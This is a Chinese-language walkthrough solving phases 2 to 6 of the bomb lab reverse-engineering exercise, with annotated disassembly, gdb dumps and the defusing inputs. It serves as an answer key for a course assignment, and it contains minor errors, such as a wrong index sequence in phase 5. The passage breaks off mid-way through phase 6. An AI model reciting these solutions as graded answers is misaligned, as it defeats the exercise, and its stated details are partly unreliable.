%eax+%eax 相当于 乘2 400f1c:\t39 03 cmp %eax,(%rbx) # 比较 %eax与（%rbx） 400f1e:\t74 05 je 400f25 \u0026lt;phase_2+0x29\u0026gt; #相等就跳到 400f25 400f20:\te8 15 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; #不相等就会爆炸 400f25:\t48 83 c3 04 add $0x4,%rbx # %rbx+0x4 400f29:\t48 39 eb cmp %rbp,%rbx # 比较%rbp 与 %rbx 400f2c:\t75 e9 jne 400f17 \u0026lt;phase_2+0x1b\u0026gt; #不相等就跳到400f17（是不是有点像循环） 400f2e:\teb 0c jmp 400f3c \u0026lt;phase_2+0x40\u0026gt; # 跳到400f3c 400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx # 栈指针+4后赋值给%rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp # 栈指针+24后赋值给%rbp 400f3a:\teb db jmp 400f17 \u0026lt;phase_2+0x1b\u0026gt; #跳到400f17 400f3c:\t48 83 c4 28 add $0x28,%rsp #可以理解为释放栈？ 400f40:\t5b pop %rbx 400f41:\t5d pop %rbp 400f42:\tc3 retq  分析完后，会发现，这个函数的功能是比较我们输入的6个数是否为等比数列，从 cmpl $0x1,(%rsp)可以看出，最先开始的值为1，然后add %eax,%eax这个表示，等比数列的比值为2，由此可以推出我们需要输入的六个数字为\n1 2 4 8 16 32  3. phase_3 首先也是在bomb.asm文件中，定位到phase_3的位置，然后逐句分析\n0000000000400f43 \u0026lt;phase_3\u0026gt;: 400f43:\t48 83 ec 18 sub $0x18,%rsp #栈帧相关 400f47:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx # 将栈指针地址赋值给 %rcx 400f4c:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx # 将栈指针地址+0x8 赋值给 %rdx 400f51:\tbe cf 25 40 00 mov $0x4025cf,%esi # 将0x4025cf的内容赋值给%esi 400f56:\tb8 00 00 00 00 mov $0x0,%eax #将0赋值给 %eax 400f5b:\te8 90 fc ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 400f60:\t83 f8 01 cmp $0x1,%eax #比较1 与 %eax的内容 400f63:\t7f 05 jg 400f6a \u0026lt;phase_3+0x27\u0026gt; #大于1 则跳到 400f6a 400f65:\te8 d0 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; # 否则爆炸 400f6a:\t83 7c 24 08 07 cmpl $0x7,0x8(%rsp) # 比较 （%rsp+8）与 7 400f6f:\t77 3c ja 400fad \u0026lt;phase_3+0x6a\u0026gt; # 大于则跳转400fad，爆炸 400f71:\t8b 44 24 08 mov 0x8(%rsp),%eax # 将（%rsp+8） 赋值给 %eax，也就是第一个 400f75:\tff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) #并跳转至%rax*8+0x402470的内存保存的地址上 400f7c:\tb8 cf 00 00 00 mov $0xcf,%eax 400f81:\teb 3b jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f83:\tb8 c3 02 00 00 mov $0x2c3,%eax 400f88:\teb 34 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f8a:\tb8 00 01 00 00 mov $0x100,%eax 400f8f:\teb 2d jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f91:\tb8 85 01 00 00 mov $0x185,%eax 400f96:\teb 26 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f98:\tb8 ce 00 00 00 mov $0xce,%eax 400f9d:\teb 1f jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f9f:\tb8 aa 02 00 00 mov $0x2aa,%eax 400fa4:\teb 18 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fa6:\tb8 47 01 00 00 mov $0x147,%eax 400fab:\teb 11 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fad:\te8 88 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400fb2:\tb8 00 00 00 00 mov $0x0,%eax 400fb7:\teb 05 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fb9:\tb8 37 01 00 00 mov $0x137,%eax 400fbe:\t3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2:\t74 05 je 400fc9 \u0026lt;phase_3+0x86\u0026gt; 400fc4:\te8 71 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400fc9:\t48 83 c4 18 add $0x18,%rsp 400fcd:\tc3 retq  分析到jmpq *0x402470(,%rax,8)这一步，就得停下来看看，这个跳转的内容了。而且前面mov $0x4025cf,%esi这个也需要看看其中的内容是什么。\n$ gdb bomb ...... (gdb) x/s 0x4025cf 0x4025cf:\t\u0026quot;%d %d\u0026quot;  可以看到 0x4025cf这个地址的内容是两个整数，再看到下面有scanf函数，可以推测我们需要输入两个整数。 栈顶 %rsp 的前 8 位存的是函数的返回地址所在栈地址，从 8(%rsp)开始存第一个参数。由cmpl $0x7,0x8(%rsp)这一步可以看到，第一个数需要比7小才不会爆炸。所以有 0～7可以选择。\n接着 看看*0x402470(,%rax,8),这个可以看作是 %rax*8+0x402470。已经把第一个参数传到 %eax 里，x86-64规定低位四字节作整体传的时候，高四字节置 0 。把 0x402470里的东西输出看一下：\n(gdb) x/8a 0x402470 0x402470:\t0x400f7c \u0026lt;phase_3+57\u0026gt;\t0x400fb9 \u0026lt;phase_3+118\u0026gt; 0x402480:\t0x400f83 \u0026lt;phase_3+64\u0026gt;\t0x400f8a \u0026lt;phase_3+71\u0026gt; 0x402490:\t0x400f91 \u0026lt;phase_3+78\u0026gt;\t0x400f98 \u0026lt;phase_3+85\u0026gt; 0x4024a0:\t0x400f9f \u0026lt;phase_3+92\u0026gt;\t0x400fa6 \u0026lt;phase_3+99\u0026gt;  可以看到出现了八个地址，分别对应这上面未分析的汇编代码的八个地址，有点像switch,再往下跳转，cmp 0xc(%rsp),%eax,也就是说第二个参数只要是跟其中一个相等，就会避开炸弹。 列出这八个数，以及对应的第一个参数。\n十六进制 十进制 第一个参数 0xcf 207 0 0x2c3 707 2 0x100 256 3 0x185 389 4 0xce 206 5 0x2aa 682 6 0x147 327 7 0x137 311 1  所以，第一个参数可以从 0～7选择，第二个参数是它对应的十进制数。验证\n1 311 Halfway there!  成功！\n4. phase_4 可以看到phase_4前面的部分，跟phase_3很相似，都是输入两个参数。接着还是逐句分析。\n0000000000400fce \u0026lt;func4\u0026gt;: 400fce:\t48 83 ec 08 sub $0x8,%rsp 400fd2:\t89 d0 mov %edx,%eax 400fd4:\t29 f0 sub %esi,%eax 400fd6:\t89 c1 mov %eax,%ecx 400fd8:\tc1 e9 1f shr $0x1f,%ecx #逻辑右移31位 400fdb:\t01 c8 add %ecx,%eax 400fdd:\td1 f8 sar %eax 400fdf:\t8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2:\t39 f9 cmp %edi,%ecx 400fe4:\t7e 0c jle 400ff2 \u0026lt;func4+0x24\u0026gt; 400fe6:\t8d 51 ff lea -0x1(%rcx),%edx 400fe9:\te8 e0 ff ff ff callq 400fce \u0026lt;func4\u0026gt; 400fee:\t01 c0 add %eax,%eax 400ff0:\teb 15 jmp 401007 \u0026lt;func4+0x39\u0026gt; 400ff2:\tb8 00 00 00 00 mov $0x0,%eax 400ff7:\t39 f9 cmp %edi,%ecx 400ff9:\t7d 0c jge 401007 \u0026lt;func4+0x39\u0026gt; 400ffb:\t8d 71 01 lea 0x1(%rcx),%esi 400ffe:\te8 cb ff ff ff callq 400fce \u0026lt;func4\u0026gt; 401003:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007:\t48 83 c4 08 add $0x8,%rsp 40100b:\tc3 retq 000000000040100c \u0026lt;phase_4\u0026gt;: 40100c:\t48 83 ec 18 sub $0x18,%rsp 401010:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a:\tbe cf 25 40 00 mov $0x4025cf,%esi 40101f:\tb8 00 00 00 00 mov $0x0,%eax 401024:\te8 c7 fb ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 401029:\t83 f8 02 cmp $0x2,%eax 40102c:\t75 07 jne 401035 \u0026lt;phase_4+0x29\u0026gt; 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) #比较输入的第一个参数与 0xe 401033:\t76 05 jbe 40103a \u0026lt;phase_4+0x2e\u0026gt; #\u0026lt;= 跳转 401035:\te8 00 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 40103a:\tba 0e 00 00 00 mov $0xe,%edx #第三个参数设为 0xe 40103f:\tbe 00 00 00 00 mov $0x0,%esi #第二个参数设为 0x0 401044:\t8b 7c 24 08 mov 0x8(%rsp),%edi 第一个参数为输入的第一个数 401048:\te8 81 ff ff ff callq 400fce \u0026lt;func4\u0026gt; 40104d:\t85 c0 test %eax,%eax #判断返回值正负 40104f:\t75 07 jne 401058 \u0026lt;phase_4+0x4c\u0026gt; #非0跳转爆炸 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) #比较输入的第二个参数 401056:\t74 05 je 40105d \u0026lt;phase_4+0x51\u0026gt; #相等则跳过爆炸 401058:\te8 dd 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 40105d:\t48 83 c4 18 add $0x18,%rsp 401061:\tc3 retq  由分析可知，当调用func4返回值为0的时候，才能不触发炸弹。所以接着分析func4。 为了方便分析，将func4 翻译成c 语言代码：\nint func4(int x,int y,int z){ int res = z-y; int tmp = res\u0026gt;\u0026gt;31; res= (res+tmp)\u0026gt;\u0026gt;1; tmp = res+y; if(x\u0026gt;tmp){ z = tmp-1; res=func4(x,y,z); res+=res; return res; }else{ res=0; if(x\u0026gt;=tmp){ /*目标*/ return res; } y=tmp+1; res=func4(x,y,z); res = res*res+1; return res; } }  可以看到 当x\u0026gt;=tmp的时候，函数会返回我们预期的0。 由上边分析可知道，函数func4的三个参数分别为 x(我们输入的第一个参数)、0、14。代入上边代码，可以得到tmp=7（第一次）所以，当x=7的时候，就刚好可以满足这个条件。所以暂时确定第一个数为 7.\n往下继续分析 cmpl $0x0,0xc(%rsp) 这一句就表明了，第二个输入的参数为 0\n最终答案为：\n7 0 So you got that one. Try this one.  5. phase_5  On x86_64, segmented addressing is no longer used, but the both the FS and GS registers can be used as base-pointer addresses in order to access special operating system data-structures. So what you\u0026rsquo;re seeing is a value loaded at an offset from the value held in the FS register, and not bit manipulation of the contents of the FS register. Specifically what\u0026rsquo;s taking place, is that FS:0x28 on Linux is storing a special sentinel stack-guard value, and the code is performing a stack-guard check. For instance, if you look further in your code, you\u0026rsquo;ll see that the value at FS:0x28 is stored on the stack, and then the contents of the stack are recalled and an XOR is performed with the original value at FS:0x28. If the two values are equal, which means that the zero-bit has been set because XOR\u0026rsquo;ing two of the same values results in a zero-value, then we jump to the test routine, otherwise we jump to a special function that indicates that the stack was somehow corrupted, and the sentinel value stored on the stack was changed. 在 x86_64 上，不再使用分段寻址，但 FS 和 GS 寄存器都可以用作基址指针地址，以便访问特殊的操作系统数据结构。所以你看到的是一个加载的值与 FS 寄存器中保存的值有一个偏移量，而不是对 FS 寄存器内容的位操作。 具体发生的事情是，Linux 上的 FS:0x28 正在存储一个特殊的哨兵堆栈保护值，并且代码正在执行堆栈保护检查。例如，如果您进一步查看代码，您会看到 FS:0x28 处的值存储在堆栈中，然后调用堆栈中的内容并与 FS:0x28 处的原始值执行 XOR .如果两个值相等，这意味着已经设置了零位，因为对两个相同的值进行异或会产生一个零值，那么我们跳转到测试例程，否则我们跳转到一个特殊的函数，表明堆栈以某种方式损坏，并且存储在堆栈中的标记值已更改。\n 上面是自己查了一下%fs:0x28指令的用法。\n下面开始解题。\n老方法，逐句分析\n0000000000401062 \u0026lt;phase_5\u0026gt;: 401062:\t53 push %rbx 401063:\t48 83 ec 20 sub $0x20,%rsp 401067:\t48 89 fb mov %rdi,%rbx # 将输入的参数1赋值给 %rbx 40106a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071:\t00 00 401073:\t48 89 44 24 18 mov %rax,0x18(%rsp) #作为一个栈保护值 401078:\t31 c0 xor %eax,%eax #异或 置零 40107a:\te8 9c 02 00 00 callq 40131b \u0026lt;string_length\u0026gt; #调用函数计算字符串长度 40107f:\t83 f8 06 cmp $0x6,%eax 401082:\t74 4e je 4010d2 \u0026lt;phase_5+0x70\u0026gt; #输入的字符串长度等于6，继续 401084:\te8 b1 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt;#否则，爆炸 401089:\teb 47 jmp 4010d2 \u0026lt;phase_5+0x70\u0026gt; 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f:\t88 0c 24 mov %cl,(%rsp) 401092:\t48 8b 14 24 mov (%rsp),%rdx 401096:\t83 e2 0f and $0xf,%edx 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4:\t48 83 c0 01 add $0x1,%rax 4010a8:\t48 83 f8 06 cmp $0x6,%rax 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; 4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd:\te8 76 02 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010c6:\te8 6f 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 4010cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0:\teb 07 jmp 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010d2:\tb8 00 00 00 00 mov $0x0,%eax #将%eax置0 4010d7:\teb b2 jmp 40108b \u0026lt;phase_5+0x29\u0026gt; #跳转至40108b 4010d9:\t48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5:\t00 00 4010e7:\t74 05 je 4010ee \u0026lt;phase_5+0x8c\u0026gt; 4010e9:\te8 42 fa ff ff callq 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 4010ee:\t48 83 c4 20 add $0x20,%rsp 4010f2:\t5b pop %rbx 4010f3:\tc3 retq  这段代码最关键的部分是在下面这里。\n40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f:\t88 0c 24 mov %cl,(%rsp) 401092:\t48 8b 14 24 mov (%rsp),%rdx 401096:\t83 e2 0f and $0xf,%edx 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4:\t48 83 c0 01 add $0x1,%rax 4010a8:\t48 83 f8 06 cmp $0x6,%rax 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt;  首先 对 %rax+%rbx 的值进行高位置零拓展,接着 mov %cl,(%rsp)将截取低16位，然后 and $0xf %edx，截取低四位。这里可以理解成是，将我们输入的字符，对应ASCII码的第四位，也就是十六进制最后一位。\nmovzbl 0x4024b0(%rdx),%edx 0x4024b0+%rdx的值赋值给%edx。 这里出现了一个地址 0x4024b0,我们看看它的内容是啥。\n(gdb) x/s 0x4024b0 0x4024b0 \u0026lt;array.3449\u0026gt;:\t\u0026quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\u0026quot;  maduiersnfotvbyl...这是这个地址里边的内容。暂时不知道有什么用，接着往下看。\nmov %dl,0x10(%rsp,%rax,1) 这里就是将 %edx的低八位 赋值给 %rsp+%rax+16这个地址。注意这里的地址，是栈的地址。\n然后 %rax自增，如果%rax==6，则结束循环。 所以 %rax 从0增加到6，进行了6次循环，每次循环都从我们输入的字符中按序取一个，然后获取它的低四位（十六进制最后一位）作为下标，到0x4024b0 这个地址存放的字符串maduiersnfotvbyl...中取出字符放到%rsp+%rax+16中。\n再往下看，当循环结束后，movb $0x0,0x16(%rsp) 将 0 赋值给 %rsp+22 这里的22可以看成 16+6 则为 %rsp+6+16刚好跟前面的对应了。这里0的作用可以看成字符串结尾。\n4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd:\te8 76 02 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010c6:\te8 6f 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt;  然后，将地址0x40245e的内容作为第二个参数。这里可以看看内容是啥。\n(gdb) x/s 0x40245e 0x40245e:\t\u0026quot;flyers\u0026quot;  接着，将栈中存放第一个字符的地址赋值给%rdi作为第一个参数。调用字符串比较函数，比较这两个字符串是否相等。若不相等则爆炸，相等则顺利完成任务。\n所以，我们比较的内容是 flyers,这几个字符在maduiersnfotvbyl...中出现的位置为 9EF567 那么我们只需要到ASCII码的表中找到，十六进制末位为这几个数对应的字符，即可。\n下面是我找到的其中一个。\nIONEFG  6. phase_6 终于到最后一个了，也是最长最难的一个。老规矩先上代码：\n00000000004010f4 \u0026lt;phase_6\u0026gt;: 4010f4:\t41 56 push %r14 4010f6:\t41 55 push %r13 4010f8:\t41 54 push %r12 4010fa:\t55 push %rbp 4010fb:\t53 push %rbx 4010fc:\t48 83 ec 50 sub $0x50,%rsp 401100:\t49 89 e5 mov %rsp,%r13 401103:\t48 89 e6 mov %rsp,%rsi 401106:\te8 51 03 00 00 callq 40145c \u0026lt;read_six_numbers\u0026gt; 40110b:\t49 89 e6 mov %rsp,%r14 40110e:\t41 bc 00 00 00 00 mov $0x0,%r12d 401114:\t4c 89 ed mov %r13,%rbp 401117:\t41 8b 45 00 mov 0x0(%r13),%eax 40111b:\t83 e8 01 sub $0x1,%eax 40111e:\t83 f8 05 cmp $0x5,%eax 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; #%eax\u0026lt;=5 输入的六个数必须小于6 401123:\te8 12 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401128:\t41 83 c4 01 add $0x1,%r12d 40112c:\t41 83 fc 06 cmp $0x6,%r12d 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; 401132:\t44 89 e3 mov %r12d,%ebx 401135:\t48 63 c3 movslq %ebx,%rax 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; 401140:\te8 f5 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; #相等就会爆炸 401145:\t83 c3 01 add $0x1,%ebx 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt; 40114d:\t49 83 c5 04 add $0x4,%r13 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt; # 这个循环检验输入的六个数是否互异，存在相等的两个数就是会爆炸 401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158:\t4c 89 f0 mov %r14,%rax 40115b:\tb9 07 00 00 00 mov $0x7,%ecx 401160:\t89 ca mov %ecx,%edx 401162:\t2b 10 sub (%rax),%edx 401164:\t89 10 mov %edx,(%rax) 401166:\t48 83 c0 04 add $0x4,%rax 40116a:\t48 39 f0 cmp %rsi,%rax 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt; #这个循环是 用7分别减去这六个数 40116f:\tbe 00 00 00 00 mov $0x0,%esi 401174:\teb 21 jmp 401197 \u0026lt;phase_6+0xa3\u0026gt; 401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx # ptr=ptr-\u0026gt;next; 40117a:\t83 c0 01 add $0x1,%eax 40117d:\t39 c8 cmp %ecx,%eax 40117f:\t75 f5 jne 401176 \u0026lt;phase_6+0x82\u0026gt; 401181:\teb 05 jmp 401188 \u0026lt;phase_6+0x94\u0026gt; 401183:\tba d0 32 60 00 mov $0x6032d0,%edx 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) #将节点放到栈 %rsp+%rsi*2+32 40118d:\t48 83 c6 04 add $0x4,%rsi 401191:\t48 83 fe 18 cmp $0x18,%rsi 401195:\t74 14 je 4011ab \u0026lt;phase_6+0xb7\u0026gt; #进行六次 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a:\t83 f9 01 cmp $0x1,%ecx 40119d:\t7e e4 jle 401183 \u0026lt;phase_6+0x8f\u0026gt; #%ecx\u0026lt;=1 每个数都跟1比较 40119f:\tb8 01 00 00 00 mov $0x1,%eax 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx # 一个节点 4011a9:\teb cb jmp 401176 \u0026lt;phase_6+0x82\u0026gt; 4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba:\t48 89 d9 mov %rbx,%rcx 4011bd:\t48 8b 10 mov (%rax),%rdx 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) 4011c4:\t48 83 c0 08 add $0x8,%rax 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 \u0026lt;phase_6+0xde\u0026gt;# 将栈存的地址转换成地址内容 4011cd:\t48 89 d1 mov %rdx,%rcx 4011d0:\teb eb jmp 4011bd \u0026lt;phase_6+0xc9\u0026gt; 4011d2:\t48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9:\t00 4011da:\tbd 05 00 00 00 mov $0x5,%ebp 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax 4011e3:\t8b 00 mov (%rax),%eax 4011e5:\t39 03 cmp %eax,(%rbx) 4011e7:\t7d 05 jge 4011ee \u0026lt;phase_6+0xfa\u0026gt; #前一个数要比后一个数要大或者相等，循环比较 4011e9:\te8 4c 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2:\t83 ed 01 sub $0x1,%ebp 4011f5:\t75 e8 jne 4011df \u0026lt;phase_6+0xeb\u0026gt; 4011f7:\t48 83 c4 50 add $0x50,%rsp 4011fb:\t5b pop %rbx 4011fc:\t5d pop %rbp 4011fd:\t41 5c pop %r12 4011ff:\t41 5d pop %r13 401201:\t41 5e pop %r14 401203:\tc3 retq  首先前面callq 40145c \u0026lt;read_six_numbers\u0026gt;这里跟前面phase_2的一样，都是输入6个数，分别存在%rsp、%rsp+4、%rsp+8、%rsp+12、%rsp+16、%rsp+20。做这道题最有效的方法就是准备好草稿纸，跟着指令，记录下每个寄存器的 值，这样子思路会清晰一些.\n401114:\t4c 89 ed mov %r13,%rbp 401117:\t41 8b 45 00 mov 0x0(%r13),%eax 40111b:\t83 e8 01 sub $0x1,%eax 40111e:\t83 f8 05 cmp $0x5,%eax 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; #%eax\u0026lt;=5 输入的六个数必须小于6 401123:\te8 12 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401128:\t41 83 c4 01 add $0x1,%r12d 40112c:\t41 83 fc 06 cmp $0x6,%r12d 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; 401132:\t44 89 e3 mov %r12d,%ebx 401135:\t48 63 c3 movslq %ebx,%rax 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; 401140:\te8 f5 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; #相等就会爆炸 401145:\t83 c3 01 add $0x1,%ebx 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt; 40114d:\t49 83 c5 04 add $0x4,%r13 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt; # 这个循环检验输入的六个数是否互异，存在相等的两个数就是会爆炸  接下来会进入第一个循环，这个循环主要是判断输入的这六个数是否互不相等，若存在两个相等的数，就会爆炸。所以输入限定条件1：六个互不相等的数。\n401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158:\t4c 89 f0 mov %r14,%rax 40115b:\tb9 07 00 00 00 mov $0x7,%ecx 401160:\t89 ca mov %ecx,%edx 401162:\t2b 10 sub (%rax),%edx 401164:\t89 10 mov %edx,(%rax) 401166:\t48 83 c0 04 add $0x4,%rax 40116a:\t48 39 f0 cmp %rsi,%rax 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt; #这个循环是 用7分别减去这六个数  接着，这个循环就是对输入的六个数分别用7减去自身，并将结果覆盖原来的值。（这里标重点，后面会考）\n401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx # ptr=ptr-\u0026gt;next; 40117a:\t83 c0 01 add $0x1,%eax 40117d:\t39 c8 cmp %ecx,%eax 40117f:\t75 f5 jne 401176 \u0026lt;phase_6+0x82\u0026gt; 401181:\teb 05 jmp 401188 \u0026lt;phase_6+0x94\u0026gt; 401183:\tba d0 32 60 00 mov $0x6032d0,%edx 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) #将节点放到栈 %rsp+%rsi*2+32 40118d:\t48 83 c6 04 add $0x4,%rsi 401191:\t48 83 fe 18 cmp $0x18,%rsi 401195:\t74 14 je 4011ab \u0026lt;phase_6+0xb7\u0026gt; #进行六次 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a:\t83 f9 01 cmp $0x1,%ecx 40119d:\t7e e4 jle 401183 \u0026lt;phase_6+0x8f\u0026gt; #%ecx\u0026lt;=1 每个数都跟1比较 40119f:\tb8 01 00 00 00 mov $0x1,%eax 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx # 一个节点 4011a9:\teb cb jmp 401176 \u0026lt;phase_6+0x82\u0026gt;  这里是一个双重循环，第一层循环进行六次，每次更新0x20(%rsp,%rsi,2)的值，也就是 %rsp+32、%rsp+40、%rsp+48、%rsp+56、%rsp+64、%rsp+72 当cmp $0x1,%ecx比较（7-输入的数）与1，若大于1则会进入内层循环，可以看到 401176。\n内层循环中，mov 0x8(%rdx),%rdx 这个是不是可以看成ptr=ptr-\u0026gt;next;因为指针大小跟0x8有点像，可以推测这应该是个链表。链表头节点指针为0x6032d0。这里循环次数也跟（7-输入的数）有关。\n我们可以看看0x6032d0这有什么内容,暂时还看不出什么名堂，那就继续往下走吧。\n(gdb) x/24w 0x6032d0 0x6032d0 \u0026lt;node1\u0026gt;:\t0x0000014c\t0x00000001\t0x006032e0\t0x00000000 0x6032e0 \u0026lt;node2\u0026gt;:\t0x000000a8\t0x00000002\t0x006032f0\t0x00000000 0x6032f0 \u0026lt;node3\u0026gt;:\t0x0000039c\t0x00000003\t0x00603300\t0x00000000 0x603300 \u0026lt;node4\u0026gt;:\t0x000002b3\t0x00000004\t0x00603310\t0x00000000 0x603310 \u0026lt;node5\u0026gt;:\t0x000001dd\t0x00000005\t0x00603320\t0x00000000 0x603320 \u0026lt;node6\u0026gt;:\t0x000001bb\t0x00000006\t0x00000000\t0x00000000  接下来又是一个循环：\n4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba:\t48 89 d9 mov %rbx,%rcx 4011bd:\t48 8b 10 mov (%rax),%rdx 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) 4011c4:\t48 83 c0 08 add $0x8,%rax 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 \u0026lt;phase_6+0xde\u0026gt;# 将栈存的地址转换成地址内容 4011cd:\t48 89 d1 mov %rdx,%rcx 4011d0:\teb eb jmp 4011bd \u0026lt;phase_6+0xc9\u0026gt;  这个循环主要的作用就是将上面循环保存到对应位置的指针修改为对应的内容。\n终于到了最后一个循环，也是决定我们输入的重要内容之一：\n4011da:\tbd 05 00 00 00 mov $0x5,%ebp 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax 4011e3:\t8b 00 mov (%rax),%eax 4011e5:\t39 03 cmp %eax,(%rbx) 4011e7:\t7d 05 jge 4011ee \u0026lt;phase_6+0xfa\u0026gt; #前一个数要比后一个数要大或者相等，循环比较 4011e9:\te8 4c 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2:\t83 ed 01 sub $0x1,%ebp 4011f5:\t75 e8 jne 4011df \u0026lt;phase_6+0xeb\u0026gt;  可以看到这个循环其实就是在做一个链表前后值之间的比较，只有前面的值比后面的值大的时候才不会爆炸，也就是说这个链表其实是一个单调递减的链表，那我们需要看到构造这个链表的前两个循环。\n认真看的话，其实就是每次将次序为（7-%ecx）的链表节点，放到指定的地址，这个地址又是递增的。所以我们可以给节点按值由大到小进行排序\n 3 \u0026lt;node1\u0026gt; 4 \u0026lt;node2\u0026gt; 5 \u0026lt;node3\u0026gt; 6 \u0026lt;node4\u0026gt; 1 \u0026lt;node5\u0026gt; 2 